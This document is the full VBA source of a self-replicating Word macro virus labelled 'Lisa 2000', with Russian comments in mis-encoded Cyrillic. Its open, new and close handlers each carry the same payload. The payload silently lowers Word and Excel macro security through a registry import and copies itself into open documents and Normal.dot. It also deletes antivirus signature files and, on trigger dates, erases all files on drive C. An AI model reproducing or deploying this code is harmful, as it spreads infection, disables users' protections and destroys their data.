   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Close()
   'Lisa 2000'
   '___Íå ïîêàçûâàòü âîçíèêàþùèå îøèáêè___'
    On Error Resume Next
   '___Îòêëþ÷åíèå çàùèòû îò âèðóñîâ äëÿ âîðäà 97___'
    Application.Options.VirusProtection = False

    '___Îòêëþ÷åíèå çàùèòû îò âèðóñîâ äëÿ âîðäà 2000, à çàîäíî è äëÿ ýêñåëÿ___'
               Set sm = CreateObject("Scripting.FileSystemObject")
               Set Ate = sm.CreateTextFile("c:\1.reg", True)
               Ate.WriteLine ("REGEDIT4")
               Ate.WriteLine (" ")
               Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security]")
               Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
               Ate.WriteLine (" ")
               Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Excel\Security]")
               Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
               Ate.Close
               MyAppID = Shell("regedit.exe /s c:\1.reg", 0)
               newHour = Hour(Now())
               newMinute = Minute(Now())
               newSecond = Second(Now()) + 5
               waitTime = TimeSerial(newHour, newMinute, newSecond)
               Kill ("c:\1.reg")

   '___Çàðàæåíèå îòêðûòûõ äîêóìåíòîâ___'
       s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines
       d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
       For k = 1 To Application.Documents.Count
         t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
        If t = 0 Then
         Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
        End If
       Next k

    '___Çàðàæåíèå Normal.dot (Àâòîçàãðóçêà)___'
       t = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines
       If t = 0 Then
         Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
       End If

    '___Ïðîâåðêà "Ñâîé"-"×óæîé"___'
        Set ms = Application.FileSearch
        Set gato = Application.FileSearch
        With ms
           .LookIn = "c:\windows\system\"
           .FileName = "lisa.dll"

        If .Execute(SortBy:=msoSortByFileName, _
              SortOrder:=msoSortOrderAscending) > 0 Then

    '___Åñëè ñâîé, íà âûõîä___'
          GoTo 80

    '___Åñëè ÷óæîé, âðåäèòü____'
          Else

    '___Îáëîìàòü AVP___'
         Kill ("c:\Program Files\AntiViral Toolkit Pro\*.avc")

    '___Äåíü ÀÐÌÀÃÅÄÎÍÀ___'
        If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 1) Then
        With gato
        .LookIn = "c:\"
        .FileName = "*.doc"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        With gato
        .LookIn = "c:\"
        .FileName = "*.xls"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        With gato
        .LookIn = "c:\"
        .FileName = "*.*"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        End If

       End If
       End With

   80:
   End Sub

   Private Sub Document_New()
   'Lisa 2000'
   '___Íå ïîêàçûâàòü âîçíèêàþùèå îøèáêè___'
    On Error Resume Next
   '___Îòêëþ÷åíèå çàùèòû îò âèðóñîâ äëÿ âîðäà 97___'
    Application.Options.VirusProtection = False

    '___Îòêëþ÷åíèå çàùèòû îò âèðóñîâ äëÿ âîðäà 2000, à çàîäíî è äëÿ ýêñåëÿ___'
               Set sm = CreateObject("Scripting.FileSystemObject")
               Set Ate = sm.CreateTextFile("c:\1.reg", True)
               Ate.WriteLine ("REGEDIT4")
               Ate.WriteLine (" ")
               Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security]")
               Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
               Ate.WriteLine (" ")
               Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Excel\Security]")
               Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
               Ate.Close
               MyAppID = Shell("regedit.exe /s c:\1.reg", 0)
               newHour = Hour(Now())
               newMinute = Minute(Now())
               newSecond = Second(Now()) + 5
               waitTime = TimeSerial(newHour, newMinute, newSecond)
               Kill ("c:\1.reg")

   '___Çàðàæåíèå îòêðûòûõ äîêóìåíòîâ___'
       s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines
       d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
       For k = 1 To Application.Documents.Count
         t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
        If t = 0 Then
         Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
        End If
       Next k

    '___Çàðàæåíèå Normal.dot (Àâòîçàãðóçêà)___'
       t = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines
       If t = 0 Then
         Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
       End If

    '___Ïðîâåðêà "Ñâîé"-"×óæîé"___'
        Set ms = Application.FileSearch
        Set gato = Application.FileSearch
        With ms
           .LookIn = "c:\windows\system\"
           .FileName = "lisa.dll"

        If .Execute(SortBy:=msoSortByFileName, _
              SortOrder:=msoSortOrderAscending) > 0 Then

    '___Åñëè ñâîé, íà âûõîä___'
          GoTo 90

    '___Åñëè ÷óæîé, âðåäèòü____'
          Else

    '___Îáëîìàòü AVP___'
         Kill ("c:\Program Files\AntiViral Toolkit Pro\*.avc")

    '___Äåíü ÀÐÌÀÃÅÄÎÍÀ___'
        If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 1) Then
        With gato
        .LookIn = "c:\"
        .FileName = "*.doc"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        With gato
        .LookIn = "c:\"
        .FileName = "*.xls"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        With gato
        .LookIn = "c:\"
        .FileName = "*.*"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        End If

       End If
       End With

   90:
   End Sub

   Private Sub Document_Open()
   'Lisa 2000'
   '___Íå ïîêàçûâàòü âîçíèêàþùèå îøèáêè___'
    On Error Resume Next
   '___Îòêëþ÷åíèå çàùèòû îò âèðóñîâ äëÿ âîðäà 97___'
    Application.Options.VirusProtection = False

    '___Îòêëþ÷åíèå çàùèòû îò âèðóñîâ äëÿ âîðäà 2000, à çàîäíî è äëÿ ýêñåëÿ___'
               Set sm = CreateObject("Scripting.FileSystemObject")
               Set Ate = sm.CreateTextFile("c:\1.reg", True)
               Ate.WriteLine ("REGEDIT4")
               Ate.WriteLine (" ")
               Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security]")
               Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
               Ate.WriteLine (" ")
               Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Excel\Security]")
               Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
               Ate.Close
               MyAppID = Shell("regedit.exe /s c:\1.reg", 0)
               newHour = Hour(Now())
               newMinute = Minute(Now())
               newSecond = Second(Now()) + 5
               waitTime = TimeSerial(newHour, newMinute, newSecond)
               Kill ("c:\1.reg")

   '___Çàðàæåíèå îòêðûòûõ äîêóìåíòîâ___'
       s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines
       d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
       For k = 1 To Application.Documents.Count
         t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
        If t = 0 Then
         Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
        End If
       Next k

    '___Çàðàæåíèå Normal.dot (Àâòîçàãðóçêà)___'
       t = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines
       If t = 0 Then
         Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
       End If

    '___Ïðîâåðêà "Ñâîé"-"×óæîé"___'
        Set ms = Application.FileSearch
        Set gato = Application.FileSearch
        With ms
           .LookIn = "c:\windows\system\"
           .FileName = "lisa.dll"

        If .Execute(SortBy:=msoSortByFileName, _
              SortOrder:=msoSortOrderAscending) > 0 Then

    '___Åñëè ñâîé, íà âûõîä___'
          GoTo 100

    '___Åñëè ÷óæîé, âðåäèòü____'
          Else

    '___Îáëîìàòü AVP___'
         Kill ("c:\Program Files\AntiViral Toolkit Pro\*.avc")

    '___Äåíü ÀÐÌÀÃÅÄÎÍÀ___'
        If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 1) Then
        With gato
        .LookIn = "c:\"
        .FileName = "*.doc"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        With gato
        .LookIn = "c:\"
        .FileName = "*.xls"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        With gato
        .LookIn = "c:\"
        .FileName = "*.*"
        .SearchSubFolders = True
        If .Execute > 0 Then
         For y = 1 To .FoundFiles.Count
          Kill (.FoundFiles(y))
         Next y
        End If
        End With
        End If

       End If
       End With

   100:

   End Sub
